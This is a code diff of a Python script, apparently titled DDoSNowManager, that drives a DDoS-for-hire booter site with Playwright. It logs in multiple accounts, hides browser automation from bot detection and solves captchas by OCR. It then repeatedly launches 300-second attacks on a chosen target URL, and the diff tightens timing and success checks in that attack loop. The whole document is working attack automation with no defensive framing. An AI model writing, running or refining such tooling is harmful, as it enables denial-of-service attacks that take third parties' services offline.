@@ -21,7 +21,7 @@ if not os.path.exists(LOG_DIR):
 log_filename = f"{LOG_DIR}/ddos_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
 
 logging.basicConfig(
-    level=logging.DEBUG,
+    level=logging.INFO,
     format='%(asctime)s - %(levelname)s - %(message)s',
     handlers=[
         logging.FileHandler(log_filename, encoding='utf-8'),
@@ -29,12 +29,6 @@ logging.basicConfig(
     ]
 )
 logger = logging.getLogger(__name__)
-
-error_log_filename = f"{LOG_DIR}/error_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
-error_handler = logging.FileHandler(error_log_filename, encoding='utf-8')
-error_handler.setLevel(logging.ERROR)
-error_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
-logger.addHandler(error_handler)
 
 ocr = ddddocr.DdddOcr()
 
@@ -45,7 +39,7 @@ class DDoSNowManager:
         self.running_states = {}
         self.stop_events = {}
         self.active_threads = {}
-        logger.info(f"=== PROGRAM BAŞLADI ===")
+        logger.info("=== PROGRAM BAŞLADI ===")
         logger.info(f"Site: {self.base_url}")
         logger.info(f"Log dosyası: {log_filename}")
 
@@ -67,10 +61,9 @@ class DDoSNowManager:
         return accounts
 
     def solve_captcha(self, page, username):
+        """Captcha çöz - başarılı olana kadar dene"""
         try:
-            logger.info(f"[{username}] Deploy butonu aranıyor...")
-            
-            # Deploy butonunu bul
+            # Deploy butonuna tıkla
             deploy_btn = page.locator("button.btn-confirm:has-text('Deploy Attack')").first
             if deploy_btn.count() == 0:
                 deploy_btn = page.locator("button:has-text('Deploy Attack')").first
@@ -80,24 +73,24 @@ class DDoSNowManager:
                 
             deploy_btn.click()
             logger.info(f"[{username}] Deploy butonuna tıklandı")
-            time.sleep(3)
+            time.sleep(2)
 
             attempt = 0
             while True:
                 attempt += 1
                 try:
-                    logger.info(f"[{username}] Captcha çözüm denemesi #{attempt}")
-                    
+                    # Captcha görselini bul
                     img_elem = page.locator("img[alt='captcha']").first
                     if img_elem.count() == 0:
-                        time.sleep(2)
+                        time.sleep(1)
                         continue
                         
                     img_src = img_elem.get_attribute("src")
                     if not img_src or not img_src.startswith("data:image"):
-                        time.sleep(2)
+                        time.sleep(1)
                         continue
 
+                    # OCR ile çöz
                     base64_data = re.sub(r'^data:image/\w+;base64,', '', img_src)
                     img_bytes = base64.b64decode(base64_data)
                     img = Image.open(io.BytesIO(img_bytes))
@@ -109,17 +102,20 @@ class DDoSNowManager:
                         time.sleep(1)
                         continue
 
-                    logger.info(f"[{username}] OCR sonucu: {captcha_text}")
+                    logger.info(f"[{username}] OCR sonucu (deneme #{attempt}): {captcha_text}")
 
+                    # Captcha input'u doldur
                     captcha_input = page.locator("input[name='captcha']").first
                     if captcha_input.count() == 0:
                         logger.error(f"[{username}] Captcha input bulunamadı!")
                         return False
                         
-                    captcha_input.fill("")
+                    captcha_input.fill("")  # Temizle
+                    time.sleep(0.3)
                     captcha_input.fill(captcha_text)
-                    time.sleep(1)
+                    time.sleep(0.5)
 
+                    # Deploy butonuna tıkla (form='hubForm' olan)
                     deploy_btn2 = page.locator("button[type='submit'][form='hubForm']").first
                     if deploy_btn2.count() == 0:
                         deploy_btn2 = page.locator("button.btn-confirm:has-text('Deploy Attack')").last
@@ -128,16 +124,29 @@ class DDoSNowManager:
                         return False
                         
                     deploy_btn2.click()
-                    time.sleep(3)
+                    time.sleep(2)
 
+                    # Hata kontrolü - Invalid captcha
                     if page.locator("text=Invalid captcha code").count() > 0:
-                        logger.warning(f"[{username}] Yanlış captcha: {captcha_text}")
+                        logger.warning(f"[{username}] YANLIŞ captcha: {captcha_text} (deneme #{attempt})")
+                        # Input'u temizle ve devam et
                         captcha_input.fill("")
                         time.sleep(1)
                         continue
-                    else:
-                        logger.info(f"[{username}] Attack başlatıldı!")
+                    
+                    # Başarılı mı kontrol et - Toast mesajı veya Attack Launched!
+                    if page.locator("text=Attack Launched").count() > 0:
+                        logger.info(f"[{username}] DOĞRU captcha: {captcha_text} (deneme #{attempt}) - Attack başlatıldı!")
                         return True
+                        
+                    # Başka bir başarı kontrolü
+                    if page.locator(".Toastify__toast--success").count() > 0:
+                        logger.info(f"[{username}] DOĞRU captcha: {captcha_text} (deneme #{attempt}) - Attack başlatıldı!")
+                        return True
+                        
+                    # Eğer hata yoksa ve Toast yoksa, başarılı say
+                    logger.info(f"[{username}] DOĞRU captcha: {captcha_text} (deneme #{attempt})")
+                    return True
                         
                 except Exception as e:
                     logger.error(f"[{username}] Captcha hatası (deneme {attempt}): {e}")
@@ -147,6 +156,8 @@ class DDoSNowManager:
         except Exception as e:
             logger.error(f"[{username}] solve_captcha genel hata: {e}")
             return False
+        
+        return False
 
     def browser_worker(self, acc_id, target_url, account_data):
         username = account_data["user"]
@@ -176,29 +187,22 @@ class DDoSNowManager:
                     page = context.new_page()
                     page.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined});")
 
-                    # GİRİŞ - ipbooter.ba
+                    # ===== GİRİŞ =====
                     try:
                         logger.info(f"[{username}] Giriş sayfasına gidiliyor...")
                         page.goto(f"{self.base_url}/login", timeout=60000)
                         page.wait_for_load_state("networkidle", timeout=30000)
-                        time.sleep(5)
+                        time.sleep(3)
                         
                         # Login formu
-                        logger.info(f"[{username}] Login formu dolduruluyor...")
-                        
                         page.fill("input[name='username']", username, timeout=30000)
-                        logger.info(f"[{username}] Username dolduruldu")
-                        
                         page.fill("input[name='password']", password, timeout=30000)
-                        logger.info(f"[{username}] Password dolduruldu")
-                        
                         page.click("button[type='submit']", timeout=30000)
                         logger.info(f"[{username}] Login butonuna tıklandı")
                         time.sleep(5)
                         
                     except Exception as e:
                         logger.error(f"[{username}] Login hatası: {e}")
-                        logger.error(traceback.format_exc())
                         time.sleep(30)
                         continue
                     
@@ -212,12 +216,12 @@ class DDoSNowManager:
                     except:
                         pass
                     
-                    # Hub sayfası
+                    # ===== HUB SAYFASI =====
                     try:
                         logger.info(f"[{username}] Hub sayfasına gidiliyor...")
                         page.goto(f"{self.base_url}/hub", timeout=60000)
                         page.wait_for_load_state("networkidle", timeout=30000)
-                        time.sleep(5)
+                        time.sleep(3)
                         
                         if "login" in page.url:
                             logger.error(f"[{username}] Giriş başarısız!")
@@ -231,36 +235,36 @@ class DDoSNowManager:
                         time.sleep(30)
                         continue
 
-                    # ANA DÖNGÜ
+                    # ===== ANA SALDIRI DÖNGÜSÜ =====
                     attack_count = 0
                     while self.running_states.get(acc_id, False) and not (stop_event and stop_event.is_set()):
                         try:
                             attack_count += 1
                             logger.info(f"[{username}] Attack #{attack_count} başlatılıyor...")
                             
-                            # Hedef URL
+                            # Hedef URL - name="hub.0.host"
                             target_input = page.locator("input[name='hub.0.host']").first
                             if target_input.count() == 0:
                                 logger.error(f"[{username}] Hedef URL input bulunamadı!")
                                 page.reload()
-                                time.sleep(5)
+                                time.sleep(3)
                                 continue
                                 
-                            target_input.fill(target_url, timeout=30000)
-                            logger.info(f"[{username}] Hedef URL dolduruldu: {target_url}")
+                            target_input.fill(target_url, timeout=10000)
+                            logger.info(f"[{username}] Hedef URL: {target_url}")
                             
-                            # Süre
-                            time_input = page.locator("input[id='hub.0.time']").first
+                            # Süre - name="hub.0.time" (input type="number")
+                            time_input = page.locator("input[name='hub.0.time']").first
                             if time_input.count() == 0:
-                                time_input = page.locator("input[name*='time']").first
+                                time_input = page.locator("input[type='number']").first
                             if time_input.count() == 0:
                                 logger.error(f"[{username}] Süre input bulunamadı!")
                                 page.reload()
-                                time.sleep(5)
+                                time.sleep(3)
                                 continue
                                 
-                            time_input.fill("300", timeout=30000)
-                            logger.info(f"[{username}] Süre dolduruldu: 300")
+                            time_input.fill("300", timeout=10000)
+                            logger.info(f"[{username}] Süre: 300 saniye")
                             
                             # CAPTCHA çöz
                             logger.info(f"[{username}] CAPTCHA çözülüyor...")
@@ -272,29 +276,34 @@ class DDoSNowManager:
 
                             logger.info(f"[{username}] Attack başladı! - {target_url}")
                             
-                            # Süre takibi
+                            # ===== SÜRE TAKİBİ =====
                             while self.running_states.get(acc_id, False) and not (stop_event and stop_event.is_set()):
                                 try:
+                                    # Accordion içindeki badge'de süre var
                                     badge = page.locator(".accordion-button .badge").first
                                     if badge.count() > 0:
                                         time_text = badge.text_content().strip()
                                         logger.info(f"[{username}] Kalan süre: {time_text}")
-                                        if time_text in ["0m 0s", "0s"]:
-                                            logger.info(f"[{username}] Süre doldu!")
+                                        
+                                        # Süre bitti mi?
+                                        if time_text in ["0m 0s", "0s", "0"]:
+                                            logger.info(f"[{username}] Süre doldu! Yeniden başlatılıyor...")
                                             break
                                     else:
+                                        # Badge yoksa attack bitmiş olabilir
                                         running = page.locator(".stats-content .badge:has-text('Running')").first
                                         if running.count() == 0:
                                             logger.info(f"[{username}] Attack bitti!")
                                             break
-                                except:
-                                    pass
+                                except Exception as e:
+                                    logger.debug(f"[{username}] Süre kontrol hatası: {e}")
                                 time.sleep(5)
 
                             if not self.running_states.get(acc_id, False):
                                 break
 
-                            logger.info(f"[{username}] Yeniden başlatılıyor...")
+                            # Sayfayı yenile ve döngüye devam et
+                            logger.info(f"[{username}] Sayfa yenileniyor...")
                             page.reload()
                             time.sleep(5)
                             
@@ -304,7 +313,6 @@ class DDoSNowManager:
 
                         except Exception as inner_e:
                             logger.error(f"[{username}] İşlem hatası (Attack #{attack_count}): {inner_e}")
-                            logger.error(traceback.format_exc())
                             page.reload()
                             time.sleep(5)
                             continue
@@ -313,7 +321,6 @@ class DDoSNowManager:
 
             except Exception as outer_e:
                 logger.error(f"[{username}] KRİTİK HATA: {outer_e}")
-                logger.error(traceback.format_exc())
                 time.sleep(10)
                 continue
 
@@ -337,6 +344,7 @@ class DDoSNowManager:
             logger.info(f"[{acc['user']}] Başlatıldı -> {target}")
             time.sleep(3)
         
+        # Durum raporu
         while True:
             time.sleep(60)
             logger.info("="*50)
